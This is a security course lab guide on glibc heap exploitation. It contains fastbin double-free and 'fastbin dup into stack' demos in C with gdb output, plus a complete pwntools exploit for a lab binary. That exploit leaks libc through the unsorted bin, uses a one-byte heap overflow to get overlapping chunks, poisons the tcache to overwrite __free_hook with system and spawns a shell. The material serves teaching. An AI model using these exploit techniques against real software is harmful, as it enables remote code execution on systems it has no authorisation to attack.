
## Practical tasks

This guide will complement the lecture slides and present code and descriptions to enable exploitation of buffer vulnerabilities.

Because the aspects we address are actual issues with `libc`, which are fixed as soon as possible, we recommend you run the exercises with `libc` up to 2.36.




### Heap

Memory allocated through `malloc`, `new` and friends, is not placed on the stack. It is placed in the Heap, a zone usually located before the shared libraries, and growing upwards. As we talked in the theoretical part, the heap chunks allocated do not directly map to individual pages, and there are several structures keeping track of used and freed chunks. As chunks are freed they are placed on bins, which can be used when a new chunk of the same size is allocated. This makes sense to improve speed as a program frequently works with chunks (e.g., from structures of objects) that are mostly the same size, or similar sizes.
However, this process is not bullet proof and there may be some [attacks possible](https://github.com/shellphish/how2heap), that are valid for specific glibc versions.


Recent versions of glibc use the following structures:

- `fastbin`: A set of single linked lists of free chunks with specific sizes (up to `0xb0` bytes). They are consumed from the top, as the logic is minimal. Chunks are first placed here and later consolidated. This is meant for fast access of recent chunks.
- `unsorted bin`: This is a double linked list with chunks of any size and it's the first place were chunks are placed when consolidating and before sorting into other bins.
- `small bin`: There are 62 of these bins, each being composed by a double linked list of freed chunks of a specific size. Chunks were are coalesced (merged) with adjacent free chunks to match a given size and placed here.
- `large bin`: A set of double linked lists of chunks with larger sizes. Each bin stores a range of sizes. The logic is similar to the `small bin` but more complex. Getting a chunk implies finding the "best matching one", extracting the needed size and keep the remainder as a new chunks.
- `tcache`: This was introduced in `libc 2.26` and constitutes a set of 64 double linked lists (bins), each storing object of a specific size. It also includes a counter with the size of the bin and the size is reduced (typically 7). It was meant as a fast, per thread, list to speedup memory access in multi-threaded programs. This avoids the need to locking the global arena where the other bins are placed.

These are all in a `Arena` that stores additional metadata. Chunks also had a set of hooks that were called by `malloc` at specific situations (e.g. `__free_hook`), but this was removed in `libc 2.34`.

A detailed overview of this is present [here](https://sourceware.org/glibc/wiki/MallocInternals). Take in consideration that some details change with the `libc` version in use.


The most basic attack to be conducted is the `double free`. It basically relies on freeing a block twice, and is the base of most other attacks. The attack allows editing other chunks, heap metadata structures or even provide the means for arbitrary read or write. However, this is not that trivial in recent libc versions as mitigations were developed (but bugs may still exist).

In particular, when considering the `fastbin`, as it is a linked list, each chunk has the address of the next chunk in the list. If we overwrite the address stored there, when allocating a new chunk we may "force" `malloc` to give us access to an area in another location (e.g, in the stack).

Consider the following program that plays with the heap, and is valid for `libc 2.34` (Ubuntu 22.04 LTS). It works because `calloc` will prefer the slow path (`fastbin`) instead of the `tcache` if `tcache` is full.

You can create a Docker container with an older `libc` version (e.g., Ubuntu 22.04) to test it, using the following command: 
```bash
docker run -it --rm -v .:/target ubuntu:22.04 bash
apt update
apt install -y build-essential gdb gef
cd /target
gcc -g -o fastbin_dup fastbin_dup.c -no-pie
```

The code is as follows:

```c
// File : fastbin_dup.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define chunks 8

int main()
{
    setbuf(stdout, NULL);
    // Fill the tcache so that future allocations go to the fastbin
    // Calloc will favour the fastbin instead of the tcache
    void *ptrs[chunks];
    for (int i=0; i<chunks; i++) {
        ptrs[i] = malloc(8);
        printf("malloc num: %d: %p\n", i, ptrs[i]);
    }

    for (int i=0; i<chunks; i++) {
        free(ptrs[i]);
    }
    
    int *a = calloc(1, 8); // Allocate 3 small chunks
    int *b = calloc(1, 8); // Calloc will use the fastbin first
    int *c = calloc(1, 8);

    free(a); // Free places chunks on the fastbins
    free(b);
    free(a); // Free a again! Should not happen!

    printf("fastbin should be [ %p, %p, %p ].\n", a, b, a);

    a = calloc(1, 8); // allocate three more
    b = calloc(1, 8);

    printf("1st calloc(1, 8): %p\n", a);
    printf("2nd calloc(1, 8): %p\n", b);
    c = calloc(1, 8);

    printf("3rd calloc(1, 8): %p\n", c);
    // Should be dup
}
```

__ Tasks:__

- Compile it and test the result. Use Docker if needed to have an older `libc` version.
- Analyze the output and see that the last `calloc` returns the same address as the first
- Verify that `a` equals `c`
- change the value of `chunks` and see the impact to the addresses obtained by `calloc`

In order to check the operation in detail, break at line 25 (`break fastbin_dup.c:25`) and then issue `heap bins` to show how the bins are structure.
The result should be similar to the following. Observe that the last free block is at the `fastbin`.

```─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Tcachebins[idx=0, size=0x20, count=7] ←  Chunk(addr=0x555555559360, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559340, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559320, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559300, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555592e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555592c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Fastbins for arena at 0x7ffff7df2c60 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x555555559380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Unsorted Bin for arena at 0x7ffff7df2c60 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Small Bins for arena at 0x7ffff7df2c60 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Large Bins for arena at 0x7ffff7df2c60 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

If you move forward and `free` the recently allocated blocks, you will get:
```
...
Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x555555559380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555593a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  →  [loop detected]
...
```

If you move after the final `calloc` calls, you will see that the `fastbin` is consumed (and there is an error).

```
Fastbins[idx=0, size=0x20] [!] Command 'heap bins fast' failed to execute properly, reason: Cannot access memory at address 0x555555559
```



### Exploiting Use After Free

If you notice from the last example, the last `calloc` will return a duplicated chunk. That is there are two pointers to the same chunk. If we write to one of them, the other will see the change. This is a classic _Use After Free_ situation.
This means that we can control what is returned by overwriting the `fastbin` head pointer.

One possible attack is named _Fastbin Dup into stack_. It works by corrupting the `fastbin` so that it provides a chunk from a arbitrary address. 
In this case we are using the stack, but the method provides arbitrary read over the program memory space.

The attack as demonstrated on `libc 2.35`. A live demonstration can be accessed here: https://wargames.ret2.systems/level/how2heap_fastbin_dup_into_stack_2.23
The right side is a `gdb` instance, where you can control the program. We recommend you break at `main`, `run` and examine how the heap evolves (`heap bins`) with the execution of the `next` instruction.

As an example, when stopped at line 34, we can check the result of the alternate `free`, which creates a duplicated entry (double free).

```gdb
wdb> heap bins
Heap Info for Arena 0x7f4e630dcb20
                   top: 0x62d060 (size: 0x20fa0)
        last_remainder: 0x0
(0x20)      fastbin[0]: 0x62d000 -> 0x62d020 -> 0x62d000 (duplicate entry)
(0x30)      fastbin[1]: 0x0
(0x40)      fastbin[2]: 0x0
(0x50)      fastbin[3]: 0x0
(0x60)      fastbin[4]: 0x0
(0x70)      fastbin[5]: 0x0
(0x80)      fastbin[6]: 0x0
      unsorted bins[0]: 0x0
```

Consider the following variation of the previous program:

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
        void *ptrs[7];
        unsigned long stack_var[2] __attribute__ ((aligned (0x10)));

        for (int i=0; i<7; i++) {
                ptrs[i] = malloc(8);
        }
        for (int i=0; i<7; i++) {
                free(ptrs[i]);
        }

        int *a = calloc(1,8);
        int *b = calloc(1,8);
        int *c = calloc(1,8);

        fprintf(stderr, "1st calloc(1,8): %p\n", a);
        fprintf(stderr, "2nd calloc(1,8): %p\n", b);
        fprintf(stderr, "3rd calloc(1,8): %p\n", c);

        free(a);
        free(b);
        free(a);

        unsigned long *d = calloc(1,8);
        unsigned long *e = calloc(1,8);
        fprintf(stderr, "4th calloc(1,8): %p\n", d);
        fprintf(stderr, "5th calloc(1,8): %p\n", e);

        fprintf(stderr,"We can access %p while it remains at the head of the free list.\n", a);
        fprintf(stderr,"Write a fake free size (0x20) to the stack\n");
        stack_var[1] = 0x20;
        fprintf(stderr, "Overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);

        unsigned long ptr = (unsigned long) stack_var;
        unsigned long addr = (unsigned long) d;

        *d = (addr >> 12) ^ ptr; // Safe Linking mechanism

        fprintf(stderr, "6th calloc(1,8): %p, putting the stack address on the free list\n", calloc(1,8));

        void *p = calloc(1,8);
        fprintf(stderr, "7th calloc(1,8): p=%p (stack_var=%p)\n", p, stack_var);
}
```

__Tasks:__

- Compile the program and analyse how the heap evolves.
- Observe the status before the last `calloc`

If we execute the program, the result will be similar to the previous case. We get a pointer to a chunk, and this same chunk is still on the `fastbin` list, ready to be provided to other calls of `calloc`.


After the `free` instructions, this is the structure of the `fastbin`

```
Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x555555559380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555593a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  →  [loop detected]
```

If we dump the first chunk, we can see the actual linking, where each chunk points to the next one. The `0x21` value is the size plus a status flag.

```
gef> g/16gx 0x555555559380
0x555555559380: 0x000055500000c6c9      0x0000000000000000
0x555555559390: 0x0000000000000000      0x0000000000000021
0x5555555593a0: 0x000055500000c629      0x0000000000000000
0x5555555593b0: 0x0000000000000000      0x0000000000000021
0x5555555593c0: 0x0000000000000000      0x0000000000000000
0x5555555593d0: 0x0000000000000000      0x0000000000020c31
```


After the chunk is corrupted, we can check the `fastbin` again:

```
Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x555555559380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x7fffffffe3c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x7fffffffe3c0]
```

The next chunk to be provided will be `0x555555559380`, but then, we will get `0x7fffffffe3c0`. The same example can be used to provide access to any other memory area.


### A Challenge

This challenge demonstrates a classic heap exploitation chain targeting the libc allocator (specifically versions prior to 2.34, where `__free_hook` still existed).

The `__free_hook` is a function pointer that is called by `free()`. By overwriting this pointer with the address of `system()`, an attacker can execute arbitrary commands when a chunk containing `/bin/sh` is freed. 

The exploit relies on two main vulnerabilities: an Information Leak (to defeat ASLR) and a Heap Overflow (to manipulate chunk metadata and overlap chunks).

Obtain the files from [here](../labs/heap/burger.zip).

#### Exploit Overview

- Leak Stage: Frees a chunk into the "Unsorted Bin" to read a pointer to the `main_arena` (an internal libc structure), allowing the attacker to calculate the base address of libc. This will need the use of gdb to find the offsets of `main_arena` and `system` in the specific libc version used.

- Attack Stage: Uses a Heap Overflow to modify the size header of an allocated chunk. This tricks the allocator into believing a chunk is larger than it is, causing it to overlap with adjacent chunks.

- Execution: By manipulating the overlapping chunks, the attacker overwrites the `fd` (forward) pointer of a free chunk to point to `__free_hook`. They then allocate memory at that location, write the address of `system`, and trigger it by freeing a chunk containing `/bin/sh`.

Besides a vulnerability with libc, the program also has a vulnerability allowing a write beyond the allocated buffer, which is used to modify chunk metadata. This is present in the `edit` function, and the combination of `strlen` with `read` allows writing more data than the allocated size.
Specifically, the line `read(0, order, size);` does not limit the number of bytes read to the allocated size of `order`, allowing an overflow of exactly one byte. Because the chunks are contiguous, this allows overwriting the size field of the next chunk.

__Setup:__

Lets define some helper functions to interact with the binary:

```python

def create(size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'many: ', str(size))
    io.sendafter(b'order: ', data)

def free(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'order: ', str(idx))

def show(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'order: ', str(idx))

def edit(idx, data):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'order: ', str(idx))
    io.sendafter(b'order: ', data)
```

__Leak Stage:__

The objective is to find a way to leak a libc address. This is done by freeing a chunk into the unsorted bin and then reading its content to get a pointer to the `main_arena` structure. When a chunk is freed and placed into the Unsorted Bin (usually because it is too large for Tcache/Fastbins, or those bins are full), the allocator links it into a doubly, circular linked list.

To do this, the allocator writes `fd` (forward) and `bk` (backward) pointers __into the data section of the freed chunk__. These pointers point back to the `main_arena` inside libc.
By immediately reallocating this chunk (`create(16, ...)`), without providing content, we get the same memory back. If the program does not zero out the memory, the libc pointers remain in the memory.

```python
io = process(exe.path)
pid, io_gdb = gdb.attach(io, 'continue', api=True)

create(1033, b'a'*1033) # 0 - Prevent consolidation with Top Chunk
create(16, b'0'*16)     # 1 - Allocate Chunk 1 (Small)
free(0)                 # 0 - Free Chunk 0 -> Goes to Unsorted Bin. fd and bk point to main_arena
create(16, b'\n')       # 0 - Reallocate Chunk 0 without writing data
```

The output will contain the leaked pointers. We can extract the `fd` pointer, which points to `main_arena+OFFSET` (offset may vary with libc version).

```python
show(0)                 # 0 - Show Chunk 0 to leak libc address
io.recvuntil(b' \n')
leak = io.recvuntil(b' \n', drop=True)
log.info(f'Leaked data: {leak}')
libc.address = u64(leak.ljust(8, b'\x00')) * 0x100 - OFFSET_MAIN_ARENA
io_gdb.interrupt_and_wait()
```

The offset to `main_arena` and `system` must be determined for the specific libc version used. This can be done using `gdb`. That is because the `main_arena` is somewhat after the libc base address. We have this address (from the leak) and must find how far it is from the base (the offset). 
If we execute the program in `gdb` and break after the leak, we can check the memory map with `vmmap`. We can set the `OFFSET_MAIN_ARENA` to 0, obtaining the `raw` leaked address and then calculate the offset to the base.

Ruuning the program we have:
```
[*] Libc Base:0x7853f67e3000
```

And in gdb we have:

```gdb
gef➤  vmmap
...
0x00007853f63f7000 0x00007853f65de000 0x0000000000000000 r-x glibc/libc.so.6
```

Therefore, the `OFFSET_MAIN_ARENA` is `0x7853f67e3000 - 0x00007853f63f7000 = 0x3ec000`. We can do the same for `system`, or we specify it directly for pwnlib to calculate the address later. If we use the offset and run the script again, the base should be correct.

__Attack Stage:__

This is the core corruption phase. We need to setup three small chunks adjacent to each other, and then free one.

```python
create(32, b'2'*32) # Chunk 2
create(20, b'3'*20) # Chunk 3
create(20, b'4'*20) # Chunk 4

free(4)                  # Free Chunk 4 (It goes to Tcache/Fastbin)
```

Now we perform the overflow. We will overflow Chunk 2, writing more data than its allocated size (32 bytes). The overflow will overwrite the size field of Chunk 3's header.

``` python
# Edit Chunk 2: Write 40 bytes of 'O' + 1 byte '\x41'
edit(2, b'O'*40 + b'\x41')
```

Before Overflow, chunk 3 has a specific size (`0x20`). After Overflow, `b'\x41'` overwrites the size field of Chunk 3's header. We change Chunk 3's size to `0x41` (`0x40` size + 1 `PREV_INUSE` bit). The allocator now thinks Chunk 3 extends much further in memory, effectively covering the space occupied by Chunk 3 AND Chunk 4.
If we free Chunk 3 now, the allocator will believe it is freeing a larger chunk that includes Chunk 4's space.

```python
free(3) 
```

Because Chunk 3's size was faked to be larger (`0x40`), `free(3)` places this larger chunk into the free list (Tcache or Fastbin). However, this memory area includes the header and data of the previously freed Chunk 4.
If a new allocation is made that fits into this larger chunk, the allocator will return a pointer to this overlapping area. Like in the previews case, it contains the existing data, as memory is not zeroed out.

```Python
create(50, b'G'*16 + p64(0x0) + p64(0x21) + p64(libc.sym.__free_hook))
```

With this line we create a fake heap layout inside this new allocation, as follows:
- `b'G'*16`: Filler data to fill the space of the original Chunk 3.
- `p64(0x0) + p64(0x21)`: Reconstructs the header for Chunk 4 (which sits "inside" our new large chunk).
- `p64(libc.sym.__free_hook)`: This is the exploit. It overwrites the `fd` pointer of Chunk 4.

Since Chunk 4 was previously freed (free(4)), it is currently waiting in a Tcache/Fastbin list. The allocator determines the next available chunk by looking at Chunk 4's `fd` pointer. We just overwrote that pointer to point to `__free_hook`.


___Hijacking Execution__

The Tcache list for size `0x20` now looks like this: `Chunk 4 -> __free_hook`
We need to allocate two more chunks of size `0x20` to get to `__free_hook`, and write the address of `system` there. Then we free a chunk containing `/bin/sh` to trigger the shell.

```Python
create(20, b'/bin/sh\x00')       # Allocation A: Returns Chunk 4.
create(20, p64(libc.sym.system)) # Allocation B: Returns __free_hook
```

The first create consumes Chunk 4. The user puts `/bin/sh` string here, but that's just convenient storage; it could be anywhere. The second create asks for another chunk. The allocator follows the poisoned pointer and returns the address of `__free_hook`. We then write `system` (the address of the system function) into `__free_hook`.

To trigger the shell, we simply free the chunk containing `/bin/sh`. This causes `free()` to call `system("/bin/sh")`, giving us a shell.

```Python
free(4)
```

Normally, `free(4)` would simply free the memory. However, `__free_hook` is a special function pointer in glibc. If it is not NULL, `free()` will call the function located at `__free_hook` instead of the actual free logic, passing the chunk address as the argument.

Since we wrote system into the hook, and Chunk 4 contains `/bin/sh`, the code effectively executes: `system("/bin/sh")`.

The full exploit script is as follows:

```python
#!/usr/bin/env python3
from logging import log
from pwn import *

exe = ELF('./burger')
libc = ELF('./glibc/libc.so.6', checksec=False)

# Helper functions to interact with the binary
def create(size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'many: ', str(size))
    io.sendafter(b'order: ', data)

def free(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'order: ', str(idx))

def show(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'order: ', str(idx))

def edit(idx, data):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'order: ', str(idx))
    io.sendafter(b'order: ', data)

# Start the exploit
io = process(exe.path)
pid, io_gdb = gdb.attach(io, 'continue', api=True)

#Unsorted bin libc leak
create(1033, b'a'*1033) # Allocate large chunk to avoid consolidation
create(16, b'0'*16)     # Allocate chunk 0
free(0)                 # Free chunk 0 to put it in unsorted bin
create(16, b'\n')       # Allocate chunk 1 to avoid reusing chunk 0
show(0)                 # Show chunk 0 to leak libc address
io.recvuntil(b' \n')
leak = io.recvuntil(b' \n', drop=True)
log.info(f'Leaked libc address: {leak}')

# io_gdb.interrupt_and_wait()

libc.address = u64(leak.ljust(8, b'\x00')) * 0x100 - OFFSET_MAIN_ARENA
log.info("Libc Base:%#x", libc.address)

create(32, b'2'*32) #2 Allocate chunk 2
create(20, b'3'*20) #3 Allocate chunk 3
create(20, b'4'*20) #4 Allocate chunk 4

free(4)                 # Free chunk 4. Goes to Tcache/Fastbin

edit(2, b'O'*40 + b'\x41') # Overflow chunk 2, overwrite chunk 3 size to 0x41
free(3)                # Free chunk 3. Goes to Tcache/Fastbin as size is now 0x40

#write _free_hook into chunk 4 fwd ptr
create(50, b'G'*16 + p64(0x0) + p64(0x21) + p64(libc.sym.__free_hook))

create(20, b'/bin/sh\x00') #4 Allocate chunk A (returns chunk 4)
create(20, p64(libc.sym.system)) #5 Allocate chunk B (returns __free_hook)

free(4)               # Trigger system("/bin/sh")

io.interactive()      # Get shell
```


__Tasks:__
- Analyze the provided code and understand each step of the exploit.
- Set up a suitable environment with the vulnerable binary and the correct version of `libc`.
- Run the exploit and observe the results.
- Experiment with modifications to deepen your understanding of heap exploitation


## Further Reading and References

- https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/
- https://mohamed-fakroud.gitbook.io/red-teamings-dojo/binary-exploitation/heap-house-of-force
- https://github.com/shellphish/how2heap
- https://github.com/GonTanaka/CTF-Writeups/tree/43ab77611a7db8f4eae3fde0cc50c0e1e81cefde/Cyber_Apocalypse2022/pwn/Bon-nie-appetit
